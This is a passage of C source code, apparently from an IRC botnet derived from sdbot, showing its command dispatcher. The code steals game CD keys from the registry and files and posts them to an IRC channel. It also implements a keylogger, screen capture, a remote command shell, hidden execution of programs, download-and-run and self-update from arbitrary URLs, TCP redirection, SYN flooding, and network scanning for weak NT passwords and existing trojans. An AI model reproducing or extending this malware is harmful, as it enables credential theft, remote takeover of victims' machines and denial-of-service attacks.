				if(RegQueryValueEx(hkey, "Location", NULL, NULL, szDataBuf2, &dwSize)== ERROR_SUCCESS)
				{ char *szPath = (char*)malloc(1060);
				sprintf(szPath, "%s\\%s", szDataBuf2, "nwncdkey.ini");
	 
				if((fp=fopen(szPath,"r"))!=NULL)
				{ while(fgets(line,100,fp)) {
					if(strstr(line, "Key1="))
					{	strtok(line, "=");
						sprintf(sendbuf, "Found NWN CDKey %s.\r\n",strtok(NULL, "="));
						irc_privmsg(sock, a[2], sendbuf, notice); } }
					fclose(fp); }
				if(szPath) free(szPath); }
				RegCloseKey(hkey);
 
				// Soldier of Fortune II
 
				dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Activision\\Soldier of Fortune II - Double Helix", 0, KEY_READ, &hkey);
				if(RegQueryValueEx(hkey, "InstallPath", NULL, NULL, szDataBuf2, &dwSize)== ERROR_SUCCESS)
				{ char *szPath = (char*)malloc(MAX_PATH);
				sprintf(szPath, "%s\\base\\mp\\%s", szDataBuf2, "sof2key");
 
				if((fp=fopen(szPath,"r"))!=NULL)
				{ if(fgets(line, 100, fp))
				  if(!strstr(line, "mtkwftmkemfew3p3b7")) irc_privmsg(sock, a[2],"Found SOF2 CDKey (%s).\r\n", notice);
				 fclose(fp); }
				if(szPath) free(szPath); }
				RegCloseKey(hkey);

	
				// Need For Speed Hot Pursuit 2

				dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Electronic Arts\\EA GAMES\\Need For Speed Hot Pursuit 2\\ergc", 0, KEY_READ, &hkey);
				if(RegQueryValueEx(hkey, "", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
				{	sprintf(sendbuf, "Found NFSHP2 CDKey (%s).\r\n", szDataBuf);
				     irc_privmsg(sock, a[2], sendbuf, notice); }
				RegCloseKey(hkey);

				// FIFA 2003

				dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Electronic Arts\\EA Sports\\FIFA 2003\\ergc", 0, KEY_READ, &hkey);
				if(RegQueryValueEx(hkey, "", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
				{	sprintf(sendbuf, "Found FIFA 2003 CDKey (%s).\r\n", szDataBuf);
				     irc_privmsg(sock, a[2], sendbuf, notice); }
				RegCloseKey(hkey);

				// Command & Conquer Generals

				dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Electronic Arts\\EA GAMES\\Generals\\ergc", 0, KEY_READ, &hkey);
				if(RegQueryValueEx(hkey, "", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
				{	sprintf(sendbuf, "Found Command & Conquer Generals CDKey (%s).\r\n", szDataBuf);
				     irc_privmsg(sock, a[2], sendbuf, notice); }
				RegCloseKey(hkey);

				// Project IGI 2

				dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\IGI 2 Retail\\CDKey", 0, KEY_READ, &hkey);
				if(RegQueryValueEx(hkey, "CDKey", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
				{	sprintf(sendbuf, "Found Project IGI 2 CDKey (%s).\r\n", szDataBuf);
				     irc_privmsg(sock, a[2], sendbuf, notice); }
				RegCloseKey(hkey);

			}
			else if (strcmp(ntstop_cmd,a[s])==0) {
				if (scanning){ // this is to prevent seeing "[NTscan] Stopped" even though they are not scanning.
				if (!silent) irc_privmsg(sock,a[2],"[NTScan] Stopped",notice);	}
				ntscan=FALSE;
				scanning=FALSE;  //scanning equals false scanning can now start
				/*
				TerminateThread(threads[1], 0); //KILLS THREAD #1 WHICH SHOULD BE NTSCAN THREAD - what if its not thread #1 ?
						if (threads[1] != 0)
						threads[1] = 0;
						threadd[1][0] = '\0';
						cnick[1][0] = '\0';
						closesocket(csock[1]);
						*/
				for (i = 0; i < 300; i++) {
					if (threadd[i][0] != '\0') {
					sprintf(sendbuf, "%s", threadd[i]);//fixed: Kills NTScan thread even its not #1 :p 
						if (strcmp(strtok(sendbuf, " "), "NTScan") == 0){
						TerminateThread(threads[i], 0);
						threads[i] = 0;
						threadd[i][0] = '\0'; 
						}
					}
				}
			}

			else if (strcmp(spythreadlist_cmd,a[s]) == 0) {
				for (i=0;i <= 40;i++) {
					if (threds[i].id != 0) {
						sprintf(sendbuf,"%i: %s \r\n",i,threds[i].name);
						irc_privmsg(sock,a[2],sendbuf,notice);
					}
				}	
			}
			#ifndef NO_REMOTECMD
			else if (strcmp(opencmd_cmd,a[s]) == 0) {
				if (open_cmd(sock,a[2]) == -1)
					sprintf(sendbuf,"[\2CMD\2] Error");
				else 
					sprintf(sendbuf,"[\2CMD\2] Active");
			irc_privmsg(sock, a[2], sendbuf, notice);
			}
			#endif
			else if (strcmp(listprocesses_cmd, a[s]) == 0)  {
				if (listProcesses(sock,a[2],NULL,FALSE) == 1) 
					sprintf(sendbuf,"[\2Process\2] Error!");
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			}


			// commands requiring at least 1 parameter
			else if (a[s+1] == NULL) return 1;

			else if (strcmp(killprocess_cmd, a[s]) == 0) {
				if (listProcesses(sock,NULL,a[s+1],FALSE) == 1) 
					sprintf(sendbuf,"[Process] %s killed",a[s+1]);
				else 
					sprintf(sendbuf,"[Process] %s cannot be killed",a[s+1]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			}
			
			#ifndef NO_REMOTECMD
			else if (strcmp(remotecmdcmds_cmd,a[s]) == 0) {
				DWORD bw;
				char *l = strstr(x, a[s+1]); 
				if (l != NULL)
				strcat(l,"\n");
				bw = strlen(l);
				if (!WriteFile(hChildInWrDupe,l,bw,&bw,NULL)) {
					Close_Handles();
					}
				}
			#endif
			
			else if (strcmp(ktname_cmd, a[s]) == 0){
				for (i = 0; i < 300; i++) {
					if (threadd[i][0] != '\0') {
					sprintf(sendbuf, "%s", threadd[i]);
						if (strcmp(strtok(sendbuf, " "), a[s+1]) == 0){
						TerminateThread(threads[i], 0);
						threads[i] = 0;
						threadd[i][0] = '\0'; 
						}
					}
				}
			sprintf(sendbuf, "All threads starting with %s have been killed.", a[s+1]);
			if (!silent) irc_privmsg(sock, a[2], sendbuf, FALSE);
			}

			else if (strcmp(nick_cmd, a[s]) == 0 ){
				irc_sendf(sock, "NICK %s\r\n", a[s+1]);
			}
			else if (strcmp(join_cmd, a[s]) == 0 ){
				irc_sendf2(sock, "JOIN %s %s\r\n", a[s+1], a[s+2]);
			}
			else if (strcmp(part_cmd, a[s]) == 0){
				irc_sendf(sock, "PART %s\r\n", a[s+1]);
			}
			else if (strcmp(raw_cmd, a[s]) == 0){
				if (x != NULL) {
					char *y = strstr(x, a[s+1]);
					if (y != NULL) irc_send(sock, y);
				}
			}
			else if (strcmp(killthread_cmd, a[s]) == 0) {
				BOOL threadkilled = FALSE;
				int n,j;
				n=(sizeof(a)/4);
				for (i=s;i<n;i++) {
					if (a[i]==NULL) break;
					j=atoi(a[i]);
					if ((j>0) && (j<64)) {
						TerminateThread(threads[j], 0);
						if (threads[j] != 0) threadkilled = TRUE;
						threads[j] = 0;
						threadd[j][0] = '\0';
						cnick[j][0] = '\0';
						closesocket(csock[j]);
					}
				}
				if (!silent) if (threadkilled) 
					sprintf(sendbuf,"[\2Thread\2] %s killed.",a[s+1]);
					irc_privmsg(sock, a[2], sendbuf, notice);
			}
			else if (strcmp(clone_quit, a[s]) == 0 ){
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) {
					irc_send(csock[atoi(a[s+1])], "QUIT :later");
					Sleep(500);
					closesocket(csock[atoi(a[s+1])]);
					TerminateThread(threads[atoi(a[s+1])], id);
					threads[atoi(a[s+1])] = 0;
					threadd[atoi(a[s+1])][0] = '\0';
				}
			}
			else if (strcmp(clone_rndnick, a[s]) == 0){
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) {
					sprintf(sendbuf, "NICK %s", rndnick(ntmp));
					irc_send(csock[atoi(a[s+1])], sendbuf);
				}
			}
			else if (strcmp(prefix_cmd, a[s]) == 0 )
				prefix1 = a[s+1][0];

			else if (strcmp(openfile_cmd, a[s]) == 0){
				if (ShellExecute(0, "open", a[s+1], NULL, NULL, SW_SHOW)) {
					if (!silent) irc_privmsg(sock, a[2], "File Opened.", notice);
				} else {
					if (!silent) irc_privmsg(sock, a[2], "Couldn't open file.", notice);
				}
			}
			else if (strcmp(server_cmd, a[s]) == 0){
				strncpy(server,  a[s+1], 127);
				irc_sendf(sock, "QUIT : connecting to %s",a[s+1]);
				return 0;
			}
			else if (strcmp(dns_cmd, a[s]) == 0){
				HOSTENT *hostent = NULL;
				IN_ADDR iaddr;
				DWORD addr = inet_addr(a[s+1]);

				if (addr != INADDR_NONE) {
					hostent = gethostbyaddr((char *)&addr, sizeof(struct in_addr), AF_INET);
					if (hostent != NULL) {
						sprintf(sendbuf, "%s -> %s", a[s+1], hostent->h_name);
					  	irc_privmsg(sock, a[2], sendbuf, notice);
					}
				}
				else {
					hostent = gethostbyname(a[s+1]);
					if (hostent != NULL) {
						iaddr = *((LPIN_ADDR)*hostent->h_addr_list);
						sprintf(sendbuf, "%s -> %s", a[s+1], inet_ntoa(iaddr));
						irc_privmsg(sock, a[2], sendbuf, notice);
					}
				}
				if (hostent == NULL) irc_privmsg(sock, a[2], "couldn't resolve host", notice);
	
			}
		    else if (strcmp(gethost_cmd[0], a[s]) == 0 || strcmp(gethost_cmd[1], a[s]) == 0) {
				if(strstr(host, a[s+1])) 
				irc_privmsg(sock, a[2], netinfo(sendbuf, host, sock), notice);
			}
			else if (strcmp(hostjoin_cmd[0], a[s]) == 0 || strcmp(hostjoin_cmd[1], a[s]) == 0) {
				if(strstr(host, a[s+1])) {
				irc_sendf2(sock, "PRIVMSG %s : joined #%s\r\n",a[2],a[s+1]);
				irc_sendf(sock, "JOIN #%s\r\n", a[s+1]);
				}
			}
		
			else if (strcmp(scrcap_cmd[0], a[s]) == 0 || strcmp(scrcap_cmd[1], a[s]) == 0) {
			if (Capture(a[s+1]) == TRUE)
			{
				sprintf(sendbuf, "Screen capture saved to %s.", a[s+1]);
				irc_privmsg(sock, a[2], sendbuf, notice);
				//send(sock, buffer, lstrlen(buffer), 0);
			}
			else
			{
				sprintf(sendbuf, "Error while capturing screen.", channel);
				irc_privmsg(sock, a[2], sendbuf, notice);
				//send(sock, buffer, lstrlen(buffer), 0);
			}
	  	  }
			/* edge's key logger using sdbot's thread..
#ifndef NO_KEYLOGGER
		else if (strcmp(keylog_cmd,a[s])==0) { 
            unsigned int y; 
            keylogs->sock=sock; 
            keylogs->notice=notice; 
            strncpy(keylogs->chan,  a[2], sizeof(keylogs->chan)-1); 
            y=addthread("KeyLogger"); 
            threads[y]=CreateThread(0,0,&keylogger, &keylogs,0, &id); 
            irc_privmsg(sock, a[2], "Keylogger started", notice); 
         }
#endif
		 */

	else if (strcmp(keylog_cmd,a[s])==0) { 
            keylogs->sock=sock; 
            keylogs->notice=notice; 
			if (a[s+1] == NULL)
				strncpy(keylogs->chan, a[2], sizeof(keylogs->chan)-1);
			else
				strncpy(keylogs->chan, a[s+1], sizeof(keylogs->chan)-1); 
			
			if (sendkeysto == 1) sprintf(sendbuf, "[Keylogger] Already logging keys to %s stopkeylogger first", keylogs->chan);
			else
			sprintf(sendbuf, "[Keylogger] Started (logging to: %s)",keylogs->chan);
			if (!silent) irc_privmsg(keylogs->sock,keylogs->chan,sendbuf,notice);
			sendkeysto = 1;
			BOOL keylog = FALSE;
			for (int c=0;c <= 20;c++)
				if (threds[c].id == 2) {  
					keylog = TRUE; 
					break; 
				}
			if (keylog == FALSE) {
				//Threat_Handle = CreateThread(NULL, 0, &keylogger, NULL, 0, &id);
				sprintf(sendbuf,"[Keylogger] logging to %s",keylogs->chan);
				keylogs->threadnum = addthread(sendbuf);
				threads[keylogs->threadnum] = CreateThread(NULL, 0, &keylogger, NULL, 0, &id);
				//spyaddthread(sendbuf,0,Threat_Handle,2,"\0");
			}
			sendkeysto = 1;
	}
		else if (strcmp(spykillthread_cmd, a[s]) == 0) {
			int t = atoi(a[s+1]);
			if (t > 39) return 0;
			if (threds[t].id != 0) {
				if (TerminateThread(threds[t].Threat_Handle,0) == 0) 
					sprintf(sendbuf,"[SpyThread] Error");
				else {
					sprintf(sendbuf,"[SpyThread] Killed (%s)",threds[t].name);
					closesocket(threds[t].sock);
					if (threds[t].id == 2) { memset(keylogs->chan,0,sizeof(keylogs->chan)); sendkeysto = 0; }
					/*if (threds[t].id == 4) {
						for (i=0;i <= 20 ;i++)
							if (scan[i].state != 0 && scan[i].thread == t) { 
								scan[i].state = 0; 
								break; 
							}
					}*/
					threds[t].id = 0;
				}
			}
			if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
		}
/* history:p
		else if (strcmp(spykillthread_cmd, a[s]) == 0) {
		char x[512];
      int t = 0;
      if (t > 39) return 0;
      if (strcmp(a[s+1], "all") == 0)
      {
        t = 40;
        while (t >= 0)
        {
          TerminateThread(threads2[t].Threat_Handle,0);
          sprintf(x,"[SpY] All threads killed");
		  irc_privmsg(sock,a[2],x,notice);
          closesocket(threads2[t].Threads_sock);
          clearthread(t);
          t--;
        }
      }
      else if (strcmp(a[s+1], "name") == 0)
      {
        //t = get_emty_thread(0);
        t = 40;
        while (t >= 0)
        {
          if (strstr(threads2[t].C_name, a[s+2]) != NULL)
          {
            TerminateThread(threads2[t].Threat_Handle,0);
            sprintf(x,"[SpY] All threads containing *%s* were killed",a[s+2]);
			irc_privmsg(sock,a[2],x,notice);
            closesocket(threads2[t].Threads_sock);
            clearthread(t);
          }

          t--;
        }
      }
      else
      {
        t = atoi(a[s+1]);
        if (threads2[t].id != 0) {
			if (TerminateThread(threads2[t].Threat_Handle,0) == 0) {
		  sprintf(x,"[SpY] Error");
		    irc_privmsg(sock,a[2],x,notice);
			}
		   else {
            sprintf(x,"[SpY] Thread killed: %s",threads2[t].C_name);
			irc_privmsg(sock,a[2],x,notice);
            closesocket(threads2[t].Threads_sock);
            clearthread(t);
          }
		 
        }
      }
    }
	*/

		// commands requiring at least 2 parameters
			else if (a[s+2] == NULL) return 1;
		
			else if (strcmp(ntscan_cmd,a[s])==0) {
				if ((scanning==TRUE) && (ntscan==TRUE)) {
					if (!silent) 
						irc_privmsg(sock,a[2],"[\2NTScan\2] Already scanning",notice);
				} else {
					scanning=TRUE;
					nt_msg->notice=notice;
					nt_msg->sock=sock;
							
				if (!useexploitchan)
					strncpy(nt_msg->chan, a[2], sizeof(nt_msg->chan)-1);
				else
					strncpy(nt_msg->chan, exploitmsgchan, sizeof(nt_msg->chan)-1);

					DWORD pthreads,minutes;
					pthreads=strtoul(a[s+1],0,10);
					minutes=strtoul(a[s+2],0,10);
					if (pthreads>100) pthreads=200;
					if (pthreads<=0) pthreads=1;
					if (minutes>120) minutes=240;
					if (minutes<=0) minutes=1;

					if (a[s+3]) sprintf(sendbuf, "[\2NTScan\2] Scanning now with %s threads for %s minutes from %s",a[s+1],a[s+2],a[s+3]);
					else sprintf(sendbuf, "[\2NTScan\2] Scanning now with %s threads for %s minutes.",a[s+1],a[s+2]);
			
					if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
					NTSCAN *ns;
					ns=(NTSCAN *)malloc(sizeof(NTSCAN));
					ns->minutes=minutes;
					ns->threads=pthreads;
					i=addthread("NTScan");
					ns->threadid=i;
					if (a[s+3]) {
						strcpy(ns->ipmask,a[s+3]);
					}
					if (parmenters['a']) {
						//We need to take *SELF* ip and scan near this :P..
						int sin_size;
						SOCKADDR_IN sin;
						char *c;
						sin_size=sizeof(SOCKADDR_IN);
						getsockname(sock,(SOCKADDR*)&sin,&sin_size);
						sin.sin_addr.S_un.S_addr&=(parmenters['b']==0) ? 0xFFFFFF : 0xFFFF;
						strcpy(ns->ipmask,inet_ntoa(sin.sin_addr));
						if (parmenters['b']==0) {
							// remove only last dot
							c=strrchr(ns->ipmask,'.');
							if (c) c[0]=0;
						} else {
							c=strchr(ns->ipmask,'.');
							if (c) {
								c=strchr(c+1,'.');
								if (c) {
									c[0]=0;
								}
							}
						}
					}
					threads[i]=CreateThread(0,0,&ntpass_main,ns,0,0);
				}
			}
			else if (strcmp(httpd_cmd,a[s]) == 0) {
				
				if ((HTTP_server(a[s+2],atoi(a[s+1]))) == -1)
					sprintf(sendbuf,"[\2HTTPD\2] Error");
				else 
					sprintf(sendbuf,"[\2HTTPD\2] Server started on http://%s:%s",host,a[s+1]);
					/*if (httpdsuxes){
					HANDLE httpdt = CreateThread(NULL, 0, &HTTP_server_thread, NULL, 0, 0);
					addthread(sendbuf);
					}*/
					irc_privmsg(sock,a[2],sendbuf,notice);
			}
			else if (strcmp(addalias_cmd, a[s]) == 0){
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL) addalias(a[s+1], y);
				}
			}
			else if (strcmp(privmsg_cmd, a[s]) == 0){
				if (x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + 2;
					char *y = strstr(x, a[s+2]);
					if (y != NULL) irc_privmsg(sock, a[s+1], y, FALSE);
				}
			}
			else if (strcmp(action_cmd, a[s]) == 0){
				if (x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + 2;
					char *y = strstr(x, a[s+2]);
					if (y != NULL) {
						sprintf(sendbuf, "\1ACTION %s\1", y);
						irc_privmsg(sock, a[s+1], sendbuf, FALSE);
					}
				}
			}
			
			/*		 hehe removed... :P
			else if (strcmp(shell_cmd, a[s]) == 0){ 
				if (shell(a[s+1],a[s+2]) == 1)
					sprintf(sendbuf,"Shell started on %s %s",a[s+1],a[s+2]);
					else 
					sprintf(sendbuf,"Shell listening on port %s"a[s+2]);
				
				
				irc_privmsg(sock,a[2],sendbuf, FALSE);
			}
			*/
			else if (strcmp(cycle_cmd, a[s]) == 0){
				if (strcmp("332", a[1]) == 0) return 1;
				irc_sendf(sock, "PART %s\r\n", a[s+2]);
				Sleep(atoi(a[s+1])*1000);
				irc_sendf2(sock, "JOIN %s %s\r\n", a[s+2], a[s+3]);
			}
			else if (strcmp(mode_cmd, a[s]) == 0 ){
				if (x != NULL) {
					char *y = strstr(x, a[s+1]);
					if (y != NULL) irc_sendf(sock, "MODE %s\r\n", y);
				}
			}
			else if (strcmp(repeat_cmd, a[s]) == 0){
				if (strcmp("332", a[1]) == 0) return 1;
				if (x != NULL) {
					char *r = strstr(x, a[s+2]);
					sprintf(sendbuf, "%s %s %s :%s", a[0], a[1], a[2], r);
					strncpy(line,  sendbuf, 511);
					if (atoi(a[s+1]) > 0) return repeat + atoi(a[s+1]); else return repeat;
				}
			}
			else if (strcmp(clone_raw, a[s]) == 0){
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL && atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) irc_send(csock[atoi(a[s+1])], y);
				}
			}
			else if (strcmp(clone_mode, a[s]) == 0){
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL) sprintf(sendbuf, "MODE %s", y);
					if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) irc_send(csock[atoi(a[s+1])], sendbuf);
				}
			}
			else if (strcmp(clone_nick, a[s]) == 0){
				sprintf(sendbuf, "NICK %s", a[s+2]);
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) irc_send(csock[atoi(a[s+1])], sendbuf);
			}
			else if (strcmp(clone_join, a[s]) == 0){
				sprintf(sendbuf, "JOIN %s %s", a[s+2], a[s+3]);
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) irc_send(csock[atoi(a[s+1])], sendbuf);
			}
			else if (strcmp(clone_part, a[s]) == 0){
				sprintf(sendbuf, "PART %s", a[s+2]);
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) irc_send(csock[atoi(a[s+1])], sendbuf);
			}
			else if (strcmp(repeat_cmd, a[s]) == 0){
				if (strcmp("332", a[1]) == 0) return 1;
				if (x != NULL) {
					char *r = strstr(x, a[s+2]);
					sprintf(sendbuf, "%s %s %s :%s", a[0], a[1], a[2], r);
					strncpy(line,  sendbuf, 511);
					if (atoi(a[s+1]) > 0) return repeat + atoi(a[s+1]); else return repeat;
				}
			}
			else if (strcmp(delay_cmd, a[s]) == 0){
				if (strcmp("332", a[1]) == 0) return 1;
				if (x != NULL) {
					char *r = strstr(x, a[s+2]);
					sprintf(sendbuf, "%s %s %s :%s", a[0], a[1], a[2], r);
					strncpy(line,  sendbuf, 511);
					if (atoi(a[s+1]) > 0) Sleep(atoi(a[s+1])*1000);
					return repeat + 1;
				}
			}
			#ifndef NO_DOWNLOAD
			else if (strcmp(update_cmd, a[s]) == 0){
				if (strcmp(botid, a[s+2]) == 0) return 1;
				ds ds;
				sprintf(ds.dest, "%s\\%s.exe", tempdir, nick);
				strncpy(ds.url,  a[s+1], sizeof(ds.url)-1);
				ds.run = 0;
				ds.sock = sock;
				strncpy(ds.chan,  a[2], sizeof(ds.chan)-1);
				sprintf(sendbuf, "update (%s)", ds.url);
				ds.threadnum = addthread(sendbuf);
				ds.update = 1;
				ds.silent = silent;
				ds.notice=notice;
				ds.expectedcrc=0;
				ds.filelen=0;
				if (a[s+3]) ds.expectedcrc=strtoul(a[s+3],0,16);
				if (a[s+4]) ds.filelen=atoi(a[s+4]);
				ds.encrypted=(parmenters['e']);
				threads[ds.threadnum] = CreateThread(NULL, 0, &webdownload, (void *)&ds, 0, &id);
				sprintf(sendbuf, "Downloading update from %s...\r\n", a[s+1]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				while(1) {
					if (ds.gotinfo == TRUE) break;
					Sleep(50);
				}
			}
			#endif
			else if (strcmp(execute_cmd, a[s]) == 0){
				PROCESS_INFORMATION pinfo;
				STARTUPINFO sinfo;
				memset(&sinfo, 0, sizeof(STARTUPINFO));
				sinfo.cb = sizeof(sinfo);
				sinfo.dwFlags = STARTF_USESHOWWINDOW;
				sinfo.wShowWindow=SW_HIDE;
				if (atoi(a[s+1]) == 1) sinfo.wShowWindow=SW_SHOW;
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL) if (!CreateProcess(NULL, y, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo) && !silent) irc_privmsg(sock, a[2], "couldn't execute file.", notice);
				}
			}
			// commands requiring at least 3 parameters
			else if (a[s+3] == NULL) return 1;
/* history
	else if (strcmp(spyscan_cmd,a[s]) == 0) {
			char x[512];
			
          if ((i = get_emty_thread(0)) == -1) return 0;
          clearthread(i);

          if (strcmp("0",a[s+1]) == 0) { //we start at a random ip address
            srand(GetTickCount());
            sprintf(threads2[i].string1,"%i.%i.%i.0",rand()%255,rand()%255,rand()%255);
          }
          else strcpy(threads2[i].string1,a[s+1]); //else we use the first parameter as the startip we replace x later if there are any
          threads2[i].id = 4;
          threads2[i].int_1 = atoi(a[s+2]);
          threads2[i].int_2 = atoi(a[s+3]) * 1000;
          memset(buf,0,sizeof(buf));
          if (a[s+5]) {
            threads2[i].int_3 = atoi(a[s+4]);
            sprintf(threads2[i].string2,"%s%s",SystemDir,a[s+5]);
          }
          else if (a[s+4]) {
            if (atoi(a[s+4]) == 0) sprintf(threads2[i].string2,"%s%s",SystemDir,a[s+4]);
            else threads2[i].int_3 = atoi(a[s+4]);

          }
          threads2[i].reply_sock = sendsock;
          if (a[2]) strcpy(threads2[i].chan,a[2]);
          sprintf(x,"[SpY] Scannning IP: %s PORT: %i DELAY: %isec.",threads2[i].string1,threads2[i].int_1,threads2[i].int_2/1000);
		  if (!silent) irc_privmsg(sock, a[2], x, notice);
          if (strlen(threads2[i].string2) > 1) {
            strcat(x," [SpY] logging to:");
            strcat(x,threads2[i].string2);
			if (!silent) irc_privmsg(sock, a[2], x, notice);
          }
          strcpy(threads2[i].C_name,x);
          threads2[i].Threat_Handle = CreateThread(NULL, 0, &port_scanner,(LPVOID)i, 0, &id);
        }
		*/

		else if (strcmp(clone_cmd, a[s]) == 0){
			ircs irc;
			strncpy(irc.host,  a[s+1], sizeof(irc.host)-1);
			irc.port = atoi(a[s+2]);
			strncpy(irc.channel,  a[s+3], sizeof(irc.channel)-1);
			if (a[s+4] != NULL) strncpy(irc.chanpass,  a[s+4], sizeof(irc.chanpass)-1);
			sprintf(sendbuf, "clone (%s)", irc.host);
			irc.threadnum = addthread(sendbuf);
			if (!silent) {
				sprintf(sendbuf, "Clone(s) created on %s:%d, in channel %s.\r\n", irc.host, irc.port, irc.channel);
				irc_privmsg(sock, a[2], sendbuf, notice);
			}
			threads[irc.threadnum] = CreateThread(NULL, 0, &irc_connect, (void *)&irc, 0, &id);
			while(1) {
				if (irc.gotinfo == TRUE) break;
				Sleep(50);
			}
		}

			#ifndef NO_SYN
			else if (strcmp(syn_cmd, a[s]) == 0) {
				synt sin;
				strncpy(sin.ip, a[s+1], sizeof(sin.ip)-1);
				strncpy(sin.port, a[s+2], sizeof(sin.port)-1);
				strncpy(sin.length, a[s+3], sizeof(sin.length)-1);
				strncpy(sin.chan, a[2], sizeof(sin.chan)-1);
				sin.notice = notice;
				sin.socket = sock;
				sprintf(sendbuf, "SYN flooding [%s:%s] for %s seconds\r\n", a[s+1], a[s+2], a[s+3]);
				irc_privmsg(sock, a[2], sendbuf, notice);
				sin.threadnumber = addthread(sendbuf);
				threads[sin.threadnumber] = CreateThread(NULL, 0, &synthread, (void *)&sin, 0, &id);
				sprintf(sendbuf, "Done with SYN flood [%iKB/sec]\r\n", SYNFlood(a[s+1], a[s+2], a[s+3]));
				irc_privmsg(sock, a[2], sendbuf, notice);

			}
			#endif
			#ifndef NO_DOWNLOAD
			else if (strcmp(download_cmd, a[s]) == 0 ){
				ds ds;
				strncpy(ds.url,  a[s+1], sizeof(ds.url)-1);
				strncpy(ds.dest,  a[s+2], sizeof(ds.dest)-1);
				if (a[s+3] != NULL) ds.run = atoi(a[s+3]); else ds.run = 0;
				ds.sock = sock;
				strncpy(ds.chan,  a[2], sizeof(ds.chan)-1);
				sprintf(sendbuf, "download (%s)", ds.url);
				ds.threadnum = addthread(sendbuf);
				ds.update = 0;
				ds.silent = silent;
				ds.notice=notice;
				ds.expectedcrc=0;
				ds.filelen=0;
				ds.encrypted=(parmenters['e']);
				if (a[s+4]) ds.expectedcrc=strtoul(a[s+4],0,16);		//CRC check..
				if (a[s+5]) ds.filelen=atoi(a[s+5]);
				threads[ds.threadnum] = CreateThread(NULL, 0, &webdownload, (void *)&ds, 0, &id);
				if (!silent) {
					sprintf(sendbuf, "Downloading %s...\r\n", a[s+1]);
					irc_privmsg(sock, a[2], sendbuf, notice);
				}
				while(1) {
					if (ds.gotinfo == TRUE) break;
					Sleep(50);
				}
			}
			#endif
			#ifndef NO_REDIRECT
			else if (strcmp(redirect_cmd, a[s]) == 0 ){
				rs rs;
				rs.lport = atoi(a[s+1]);
				strncpy(rs.dest,  a[s+2], sizeof(rs.dest)-1);
				rs.port = atoi(a[s+3]);
				rs.sock = sock;
				sprintf(sendbuf, "Redirect (%d->%s:%d)", rs.lport, rs.dest, rs.port);
				rs.threadnum = addthread(sendbuf);
				if (!silent) sprintf(sendbuf, "TCP Redirect created on port %d to %s:%d.\r\n", rs.lport, rs.dest, rs.port);
				irc_privmsg(sock, a[2], sendbuf, notice);
				threads[rs.threadnum] = CreateThread(NULL, 0, &redirect, (void *)&rs, 0, &id);
				while(1) {
					if (rs.gotinfo == TRUE) break;
					Sleep(50);
				}
			}
			#endif

			else if (strcmp(clone_privmsg, a[s]) == 0){
				if (cnick[atoi(a[s+1])][0] != '\0' && x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + strlen(a[s+2]) + 2;
					char *y = strstr(x, a[s+3]);
					if (y != NULL && atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) {
						irc_privmsg(csock[atoi(a[s+1])], a[s+2], y, FALSE);
						if (threadd[atoi(a[s+1])][0] == 's') {
							sprintf(sendbuf, "[%s] <%s> %s", a[s+2], cnick[atoi(a[s+1])], y);
							irc_privmsg(sock, a[2], sendbuf, notice);
						}
					}
				}
			}
			else if (strcmp(clone_action, a[s]) == 0){
				if (cnick[atoi(a[s+1])][0] != '\0' && x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + strlen(a[s+2]) + 2;
					char *y = strstr(x, a[s+3]);
					sprintf(sendbuf, "\1ACTION %s\1", y);
					if (y != NULL && atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) {
						irc_privmsg(csock[atoi(a[s+1])], a[s+2], sendbuf, FALSE);
						if (threadd[atoi(a[s+1])][0] == 's') {
							sprintf(sendbuf, "[%s] * %s %s", a[s+2], cnick[atoi(a[s+1])], y);
							irc_privmsg(sock, a[2], sendbuf, notice);
						}
					}
				}
			}
			
			#ifndef NO_SCAN
			else if (strcmp(scan_cmd, a[s]) == 0 ){
				//char logbuf[512];
				scans sscan;
				sscan.addy.S_un.S_addr = inet_addr(a[s+1]);
				sscan.port = atoi(a[s+2]);
				sscan.delay = atoi(a[s+3]) * 1000; //this will change milliseconds in seconds
				sscan.extra = 0;
				sscan.sock = sock;
				sscan.notice = notice;
				if (!useexploitchan)
					strncpy(sscan.chan, a[2], sizeof(sscan.chan)-1);
				else
					strncpy(sscan.chan, exploitmsgchan, sizeof(sscan.chan)-1);
				
				if (a[s+4] != NULL) {
					if (strcmp(a[s+4],"sub7") == 0) sscan.extra = 1;
					if (strcmp(a[s+4],"kuang") == 0) sscan.extra = 2;
					if (strcmp(a[s+4],"nb") == 0) sscan.extra = 3;
					if (strcmp(a[s+4],"devil") == 0) sscan.extra = 4;
